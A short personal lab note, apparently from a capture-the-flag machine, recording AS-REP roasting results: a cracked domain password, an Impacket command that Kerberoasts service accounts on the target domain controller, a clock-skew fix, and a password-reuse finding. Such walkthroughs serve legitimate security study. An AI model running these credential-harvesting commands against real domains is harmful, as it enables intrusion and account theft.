# ASREP Roasting
----
[[ASREP Roasting Lab]]
- `fsmith : Thestrokes23`

# Kerberoasting
----
- Now we have fsmith's credentials, we can try Kerberoasting to get hashes of s**ervice accounts with SPNs:**
	- `Impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip 10.10.10.175 -request`
		- ==Note- If we get `KRB_AP_ERR_SKEW(Clock skew too great)`run this command:==
			- `sudo rdate -n <DC_IP>`
		- ![[Pasted image 20250424210342.png]]
	- Password reuse : `Thestrokes23`
	- `hsmith` : `Thestrokes23`
		- ![[Pasted image 20250424210818.png]]